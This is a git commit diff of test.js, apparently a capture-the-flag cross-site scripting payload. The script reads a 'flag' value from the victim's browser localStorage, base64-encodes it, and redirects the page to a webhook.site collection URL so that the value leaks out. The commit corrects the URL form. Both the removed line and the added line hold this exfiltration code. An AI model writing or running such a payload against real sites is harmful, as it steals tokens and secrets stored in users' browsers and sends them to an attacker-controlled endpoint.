5a84fd13a15ceb0e52df7c8c746f8cf2e8f3b6bb
Sotero-Romero <166718598+Sotero-Romero@users.noreply.github.com>
2026-02-20 19:14:24 +0100

    Update test.js

--- test.js
+++ test.js
@@ -1,2 +1,2 @@
 flag = window.localStorage.getItem('flag')
-window.location = "https://webhook.site/#!/view/e9ad359a-1600-4645-87f6-a13b4e9d4813?c=" + btoa(flag)
+window.location = "https://webhook.site/e9ad359a-1600-4645-87f6-a13b4e9d4813/?c=" + btoa(flag)
